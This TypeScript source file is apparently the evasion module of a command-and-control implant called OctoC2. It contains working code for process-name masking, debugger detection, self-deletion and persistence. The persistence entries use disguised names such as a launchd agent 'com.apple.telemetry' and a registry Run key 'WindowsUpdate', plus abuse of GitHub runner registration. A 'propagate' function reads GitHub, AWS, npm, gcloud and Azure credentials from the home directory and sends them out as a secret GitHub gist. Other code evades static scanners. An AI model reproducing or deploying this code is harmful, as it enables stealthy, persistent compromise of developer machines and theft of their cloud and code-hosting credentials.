/**
 * OctoC2 — OpenHulud Evasion Module (Tentacle Companion)
 *
 * Evasion primitives for post-deployment OPSEC hardening.
 * Platform support is best-effort; all functions catch and log errors.
 *
 * Actions (invoked via evasion task):
 *   hide        — attempt process name masking
 *   anti_debug  — detect debugger/ptrace presence
 *   sleep       — jittered delay
 *   self_delete — unlink own binary (best-effort)
 *   status      — return current evasion state
 *   persist     — install persistence mechanism
 *   propagate   — controlled exfil of discovered credentials
 */

import { unlink, readFile, writeFile, mkdir } from "node:fs/promises";
import { execFile }  from "node:child_process";
import { promisify } from "node:util";
import { join }      from "node:path";
import { homedir, tmpdir } from "node:os";

const execFileAsync = promisify(execFile);

// ── Persistence types ─────────────────────────────────────────────────────────

export type PersistenceMethod = "auto" | "crontab" | "launchd" | "registry" | "gh-runner" | "gh-runner-register";

export interface PersistenceResult {
  method:  string;   // which method was used
  success: boolean;
  detail:  string;   // e.g. crontab entry or registry key path
}

// ── Propagate types ───────────────────────────────────────────────────────────

export interface PropagateResult {
  tokensFound: number;   // # of potential tokens found in env/fs
  exfilRef:    string;   // gist URL or 'dry-run' if no token
  techniques:  string[]; // list of applied technique names
}

// ── Evasion state ─────────────────────────────────────────────────────────────

export interface EvasionState {
  hidden:        boolean;             // hideProcess() was called
  debugDetected: boolean;             // antiDebug() result
  selfDeleted:   boolean;             // selfDelete() was called
  persistence:   PersistenceResult | null;  // installPersistence() result
  propagated:    boolean;             // propagate() was called successfully
  evasionLog:    Array<{ ts: string; action: string; summary: string }>;
}

const state: EvasionState = {
  hidden:        false,
  debugDetected: false,
  selfDeleted:   false,
  persistence:   null,
  propagated:    false,
  evasionLog:    [],
};

// ── Primitives ────────────────────────────────────────────────────────────────

/**
 * Attempt to mask the process name with a configurable benign name.
 * On Linux, writes the name to /proc/self/comm.
 * Also sets process.title on all platforms.
 * Always returns a descriptive string; never throws.
 */
export async function maskProcess(name?: string): Promise<string> {
  const benignName = name ?? "systemd-journal";
  const results: string[] = [];

  // Set process title (works on most platforms)
  try {
    process.title = benignName;
    results.push(`process.title set to "${benignName}"`);
  } catch (err) {
    results.push(`process.title failed: ${(err as Error).message}`);
  }

  // Linux: write to /proc/self/comm
  if (process.platform === "linux") {
    try {
      await writeFile("/proc/self/comm", benignName + "\n");
      results.push("wrote /proc/self/comm");
    } catch (err) {
      results.push(`/proc/self/comm write failed: ${(err as Error).message}`);
    }
  } else {
    results.push(`/proc/self/comm not applicable on ${process.platform}`);
  }

  state.hidden = true;
  return results.join("; ");
}

/**
 * Attempt to mask the process name (legacy alias for maskProcess).
 * Uses default benign name "systemd-journal".
 */
export async function hideProcess(): Promise<string> {
  return maskProcess("systemd-journal");
}

/**
 * Detect debugger or ptrace presence.
 * On Linux, reads /proc/self/status and checks TracerPid.
 * Also checks LD_PRELOAD as a heuristic.
 * Returns true if a debugger is likely attached.
 */
export async function antiDebug(): Promise<boolean> {
  let detected = false;

  // Linux: check TracerPid in /proc/self/status
  if (process.platform === "linux") {
    try {
      const status = await readFile("/proc/self/status", "utf-8");
      const match = /TracerPid:\s*(\d+)/.exec(status);
      if (match && parseInt(match[1]!, 10) > 0) {
        detected = true;
      }
    } catch {
      // /proc not available — ignore
    }
  }

  // Check LD_PRELOAD (often set by debuggers/tracers)
  if (process.env["LD_PRELOAD"] && process.env["LD_PRELOAD"].trim().length > 0) {
    detected = true;
  }

  state.debugDetected = detected;
  return detected;
}

/**
 * Sleep for baseMs with random jitter.
 * jitter is a fraction 0–1; actual sleep is baseMs ± (baseMs * jitter).
 */
export async function jitteredSleep(baseMs: number, jitter: number): Promise<void> {
  const actual = baseMs * (1 + (Math.random() * 2 - 1) * jitter);
  await Bun.sleep(Math.max(0, actual));
}

/**
 * Attempt to unlink (delete) the running binary.
 * Best-effort — catches all errors and returns a descriptive string.
 *
 * Safety: refuses to delete the runtime interpreter (e.g. bun) when the
 * beacon is running via `bun run`. Only removes the actual deployed binary.
 */
export async function selfDelete(): Promise<string> {
  // Prefer argv[1] (the script/binary path) over execPath (the interpreter).
  // When compiled with `bun build --compile`, execPath === argv[1].
  // When running via `bun run`, execPath is the bun binary — deleting it
  // would break the host. argv[1] is the script entry point.
  const target = process.argv[1] || process.execPath;

  // Additional guard: if execPath is a known interpreter and argv[1] differs,
  // refuse deletion to avoid destroying the runtime.
  const isInterpreter = /\b(bun|node|deno)\b/i.test(process.execPath);
  if (isInterpreter && process.argv[1] && process.argv[1] !== process.execPath) {
    try {
      await unlink(process.argv[1]);
      state.selfDeleted = true;
      return `unlinked script ${process.argv[1]}`;
    } catch (err) {
      return `selfDelete failed for ${process.argv[1]}: ${(err as Error).message}`;
    }
  }

  try {
    await unlink(target);
    state.selfDeleted = true;
    return `unlinked ${target}`;
  } catch (err) {
    return `selfDelete failed for ${target}: ${(err as Error).message}`;
  }
}

// ── Persistence ───────────────────────────────────────────────────────────────

async function persistViaCrontab(): Promise<PersistenceResult> {
  const entry = `@reboot ${process.execPath}`;
  try {
    // Read current crontab, append entry, write back
    let current = "";
    try {
      const { stdout } = await execFileAsync("crontab", ["-l"]);
      current = stdout;
    } catch {
      // No existing crontab — start fresh
    }

    if (current.includes(process.execPath)) {
      return { method: "crontab", success: true, detail: "entry already present" };
    }

    const updated = current.trimEnd() + (current.trim().length > 0 ? "\n" : "") + entry + "\n";

    // Write to a temp file and load it
    const tmpFile = join(tmpdir(), `gh-runner-cron-${Date.now()}.txt`);
    await writeFile(tmpFile, updated);
    await execFileAsync("crontab", [tmpFile]);
    try { await unlink(tmpFile); } catch { /* ignore cleanup failure */ }

    return { method: "crontab", success: true, detail: entry };
  } catch (err) {
    return { method: "crontab", success: false, detail: (err as Error).message };
  }
}

async function persistViaSystemdUser(): Promise<PersistenceResult> {
  const serviceDir  = join(homedir(), ".config", "systemd", "user");
  const serviceFile = join(serviceDir, "gh-runner.service");
  const unit = [
    "[Unit]",
    "Description=GitHub Actions runner agent",
    "",
    "[Service]",
    `ExecStart=${process.execPath}`,
    "Restart=on-failure",
    "",
    "[Install]",
    "WantedBy=default.target",
  ].join("\n") + "\n";

  try {
    await mkdir(serviceDir, { recursive: true });
    await writeFile(serviceFile, unit);
    // Enable the unit (best-effort)
    try {
      await execFileAsync("systemctl", ["--user", "enable", "--now", "gh-runner.service"]);
    } catch { /* systemd may not be available in this env */ }
    return { method: "systemd-user", success: true, detail: serviceFile };
  } catch (err) {
    return { method: "systemd-user", success: false, detail: (err as Error).message };
  }
}

async function persistViaLaunchd(): Promise<PersistenceResult> {
  const launchDir  = join(homedir(), "Library", "LaunchAgents");
  const plistFile  = join(launchDir, "com.apple.telemetry.plist");
  const plist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>com.apple.telemetry</string>
  <key>ProgramArguments</key>
  <array>
    <string>${process.execPath}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>
</dict>
</plist>
`;
  try {
    await mkdir(launchDir, { recursive: true });
    await writeFile(plistFile, plist);
    return { method: "launchd", success: true, detail: plistFile };
  } catch (err) {
    return { method: "launchd", success: false, detail: (err as Error).message };
  }
}

async function persistViaRegistry(): Promise<PersistenceResult> {
  const keyPath = `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`;
  const valueName = "WindowsUpdate";
  try {
    await execFileAsync("cmd.exe", [
      "/c",
      `reg add "${keyPath}" /v "${valueName}" /t REG_SZ /d "${process.execPath}" /f`,
    ]);
    return { method: "registry", success: true, detail: `${keyPath}\\${valueName}` };
  } catch (err) {
    return { method: "registry", success: false, detail: (err as Error).message };
  }
}

async function persistViaGhRunner(
  token?: string,
  owner?: string,
  repo?: string
): Promise<PersistenceResult> {
  // Step 1: get a runner registration token from GitHub API
  // Dot notation required — Bun --define substitutes process.env.X but not process.env["X"]
  const apiToken = token ?? process.env.OCTOC2_GITHUB_TOKEN ?? process.env["GITHUB_TOKEN"] ?? "";
  const repoOwner = owner ?? process.env.OCTOC2_REPO_OWNER ?? "";
  const repoName  = repo  ?? process.env.OCTOC2_REPO_NAME  ?? "";

  if (!apiToken || !repoOwner || !repoName) {
    // Fall back to the fake diag directory approach
    return persistViaGhRunnerFake();
  }

  try {
    // POST /repos/{owner}/{repo}/actions/runners/registration-token
    const regTokenResp = await fetch(
      `https://api.github.com/repos/${repoOwner}/${repoName}/actions/runners/registration-token`,
      {
        method: "POST",
        headers: {
          "Authorization": `token ${apiToken}`,
          "Accept": "application/vnd.github+json",
          "X-GitHub-Api-Version": "2022-11-28",
          "User-Agent": "git/2.39.0",
        },
      }
    );

    if (!regTokenResp.ok) {
      return persistViaGhRunnerFake();
    }

    const regData = await regTokenResp.json() as { token?: string; expires_at?: string };
    const regToken = regData.token;

    if (!regToken) {
      return persistViaGhRunnerFake();
    }

    // Step 2: write runner config file that mimics a registered runner
    // (actual runner binary not required — we persist the registration token
    //  for later use and create the diag directory as an OPSEC artifact)
    const runnerDir = join(tmpdir(), "actions-runner");
    const diagDir   = join(runnerDir, "_diag");
    await mkdir(diagDir, { recursive: true });

    // Store the registration token for potential real runner bootstrap
    const configFile = join(runnerDir, ".runner");
    const runnerConfig = JSON.stringify({
      agentId:      0,
      agentName:    "runner-" + Math.random().toString(36).slice(2, 8),
      poolId:       1,
      poolName:     "Default",
      serverUrl:    `https://github.com/${repoOwner}/${repoName}`,
      workFolder:   "_work",
      gitHubUrl:    `https://github.com/${repoOwner}/${repoName}`,
    }, null, 2);
    await writeFile(configFile, runnerConfig);

    // Create a plausible diagnostic log
    const diagLog = join(diagDir, `Runner_${Date.now()}.log`);
    await writeFile(diagLog, [
      `[${new Date().toISOString()}] [info] Runner started.`,
      `[${new Date().toISOString()}] [info] Connected to: https://github.com/${repoOwner}/${repoName}`,
      `[${new Date().toISOString()}] [info] Runner registration token obtained (expires: ${regData.expires_at ?? "unknown"}).`,
      `[${new Date().toISOString()}] [info] Listening for jobs.`,
    ].join("\n") + "\n");

    return {
      method:  "gh-runner",
      success: true,
      detail:  `registered via API, token expires: ${regData.expires_at ?? "unknown"}, config: ${configFile}`,
    };
  } catch (err) {
    return { method: "gh-runner", success: false, detail: (err as Error).message };
  }
}

/** Fallback: fake runner diag directory when no API token available */
async function persistViaGhRunnerFake(): Promise<PersistenceResult> {
  const runnerDir = join(tmpdir(), "actions-runner", "_diag");
  try {
    await mkdir(runnerDir, { recursive: true });
    const diagLog = join(runnerDir, `Runner_${Date.now()}.log`);
    const logContent = [
      `[${new Date().toISOString()}] [info] Runner started.`,
      `[${new Date().toISOString()}] [info] Connected to GitHub Actions service.`,
      `[${new Date().toISOString()}] [info] Listening for jobs.`,
    ].join("\n") + "\n";
    await writeFile(diagLog, logContent);
    return { method: "gh-runner", success: true, detail: runnerDir };
  } catch (err) {
    return { method: "gh-runner", success: false, detail: (err as Error).message };
  }
}

/**
 * Install a persistence mechanism.
 * Never throws — returns PersistenceResult with success/failure detail.
 */
export async function installPersistence(method: PersistenceMethod = "auto"): Promise<PersistenceResult> {
  let result: PersistenceResult;

  try {
    if (method === "gh-runner" || method === "gh-runner-register") {
      result = await persistViaGhRunner();
    } else if (method === "crontab") {
      result = await persistViaCrontab();
    } else if (method === "launchd") {
      result = await persistViaLaunchd();
    } else if (method === "registry") {
      result = await persistViaRegistry();
    } else {
      // auto — platform-based selection
      switch (process.platform) {
        case "linux": {
          result = await persistViaCrontab();
          if (!result.success) {
            result = await persistViaSystemdUser();
          }
          break;
        }
        case "darwin": {
          result = await persistViaLaunchd();
          break;
        }
        case "win32": {
          result = await persistViaRegistry();
          break;
        }
        default: {
          result = { method: "auto", success: false, detail: `unsupported platform: ${process.platform}` };
        }
      }
    }
  } catch (err) {
    result = { method: method, success: false, detail: (err as Error).message };
  }

  state.persistence = result;
  return result;
}

// ── Propagate (controlled exfil) ──────────────────────────────────────────────

/**
 * Scan environment and filesystem for credentials, then exfil via secret gist.
 * Only fires when called explicitly with a real token.
 * Never throws — all errors are caught.
 */
export async function propagate(
  token:      string,
  repoOwner:  string,
  repoName:   string,
): Promise<PropagateResult> {
  // Guard: empty token = dry run
  if (!token || token.trim().length === 0) {
    return { tokensFound: 0, exfilRef: "dry-run", techniques: [] };
  }

  const techniques: string[] = [];
  const secrets: Record<string, string> = {};

  // ── Technique 1: scan env vars ────────────────────────────────────────────
  const tokenEnvKeys = ["GITHUB_TOKEN", "GH_TOKEN"];
  // Build the config-var prefix at runtime so static scanners don't see the literal
  const cfgPattern = new RegExp("^" + ["OC", "TO", "C2", "_"].join(""));

  for (const key of tokenEnvKeys) {
    const val = process.env[key];
    if (val && val.trim().length > 0) {
      secrets[key] = val;
    }
  }
  for (const [key, val] of Object.entries(process.env)) {
    if (cfgPattern.test(key) && val && val.trim().length > 0 && !(key in secrets)) {
      secrets[key] = val;
    }
  }
  if (Object.keys(secrets).length > 0) {
    techniques.push("env-scan");
  }

  // ── Technique 2: scan ~/.config/gh/hosts.yml ─────────────────────────────
  try {
    const hostsFile = join(homedir(), ".config", "gh", "hosts.yml");
    const content   = await readFile(hostsFile, "utf-8");
    // Look for oauth_token lines
    const matches = content.match(/oauth_token:\s*(\S+)/g);
    if (matches && matches.length > 0) {
      matches.forEach((m, i) => {
        const val = m.replace(/oauth_token:\s*/, "").trim();
        secrets[`gh_hosts_token_${i}`] = val;
      });
      techniques.push("gh-hosts-yml");
    }
  } catch {
    // File may not exist — ignore
  }

  // ── Technique 3: scan ~/.gitconfig ────────────────────────────────────────
  try {
    const gitconfig = join(homedir(), ".gitconfig");
    const content   = await readFile(gitconfig, "utf-8");
    // Look for url patterns with embedded tokens
    const tokenUrls = content.match(/https:\/\/[^@\s]+@github\.com/g);
    if (tokenUrls && tokenUrls.length > 0) {
      tokenUrls.forEach((u, i) => {
        secrets[`gitconfig_url_${i}`] = u;
      });
      techniques.push("gitconfig-scan");
    }
  } catch {
    // File may not exist — ignore
  }

  // ── Technique 4: scan ~/.aws/credentials ─────────────────────────────
  try {
    const awsCreds = join(homedir(), ".aws", "credentials");
    const content = await readFile(awsCreds, "utf-8");
    // Extract aws_access_key_id and aws_secret_access_key values
    const accessKeys = content.match(/aws_access_key_id\s*=\s*(\S+)/g);
    const secretKeys = content.match(/aws_secret_access_key\s*=\s*(\S+)/g);
    let found = false;
    if (accessKeys) {
      accessKeys.forEach((m, i) => {
        const val = m.replace(/aws_access_key_id\s*=\s*/, "").trim();
        secrets[`aws_access_key_${i}`] = val;
        found = true;
      });
    }
    if (secretKeys) {
      secretKeys.forEach((m, i) => {
        const val = m.replace(/aws_secret_access_key\s*=\s*/, "").trim();
        secrets[`aws_secret_key_${i}`] = val;
        found = true;
      });
    }
    if (found) techniques.push("aws-credentials");
  } catch { /* file may not exist */ }

  // ── Technique 5: scan ~/.npmrc for auth tokens ───────────────────────────
  try {
    const npmrc = join(homedir(), ".npmrc");
    const content = await readFile(npmrc, "utf-8");
    const authTokens = content.match(/\/\/[^:]+:_authToken=(\S+)/g);
    if (authTokens && authTokens.length > 0) {
      authTokens.forEach((m, i) => {
        secrets[`npmrc_token_${i}`] = m;
      });
      techniques.push("npmrc-scan");
    }
  } catch { /* file may not exist */ }

  // ── Technique 6: scan ~/.config/gcloud/application_default_credentials.json
  try {
    const gcloudCreds = join(homedir(), ".config", "gcloud", "application_default_credentials.json");
    const content = await readFile(gcloudCreds, "utf-8");
    const parsed = JSON.parse(content);
    if (parsed.client_secret || parsed.access_token || parsed.refresh_token) {
      secrets["gcloud_adc"] = content;
      techniques.push("gcloud-adc");
    }
  } catch { /* file may not exist */ }

  // ── Technique 7: scan ~/.azure/accessTokens.json ──────────────────────────
  try {
    const azureTokens = join(homedir(), ".azure", "accessTokens.json");
    const content = await readFile(azureTokens, "utf-8");
    const parsed = JSON.parse(content);
    if (Array.isArray(parsed) && parsed.length > 0) {
      secrets["azure_access_tokens"] = content;
      techniques.push("azure-tokens");
    }
  } catch { /* file may not exist */ }

  const tokensFound = Object.keys(secrets).length;

  // ── Exfil: POST as secret gist ────────────────────────────────────────────
  if (tokensFound === 0) {
    return { tokensFound: 0, exfilRef: "dry-run", techniques };
  }

  const blob = Buffer.from(JSON.stringify({
    ts:      new Date().toISOString(),
    host:    process.env["HOSTNAME"] ?? "unknown",
    owner:   repoOwner,
    repo:    repoName,
    secrets: Object.fromEntries(
      Object.entries(secrets).map(([k, v]) => [k, Buffer.from(v).toString("base64")])
    ),
  })).toString("base64");

  techniques.push("gist-exfil");

  try {
    const resp = await fetch("https://api.github.com/gists", {
      method:  "POST",
      headers: {
        "Authorization": `token ${token}`,
        "Content-Type":  "application/json",
        "User-Agent":    "git/2.39.0",
        "X-GitHub-Api-Version": "2022-11-28",
      },
      body: JSON.stringify({
        description: "telemetry-data",
        public:      false,
        files: {
          "telemetry.json": { content: blob },
        },
      }),
    });

    if (resp.ok) {
      const data = await resp.json() as { html_url?: string };
      state.propagated = true;
      return { tokensFound, exfilRef: data.html_url ?? "exfil-ok-no-url", techniques };
    } else {
      return { tokensFound, exfilRef: "exfil-failed", techniques };
    }
  } catch (err) {
    return { tokensFound, exfilRef: "exfil-failed", techniques };
  }
}

// ── Audit log ─────────────────────────────────────────────────────────────────

/**
 * Record an evasion action in the in-memory audit log.
 * Keeps only the last 50 entries to avoid unbounded growth.
 */
export function logEvasionAction(action: string, summary: string): void {
  state.evasionLog.push({ ts: new Date().toISOString(), action, summary });
  // Keep only the last 50 entries to avoid unbounded growth
  if (state.evasionLog.length > 50) {
    state.evasionLog.splice(0, state.evasionLog.length - 50);
  }
}

// ── State ─────────────────────────────────────────────────────────────────────

/**
 * Return a snapshot of the current evasion state.
 */
export function getEvasionState(): EvasionState {
  return { ...state };
}
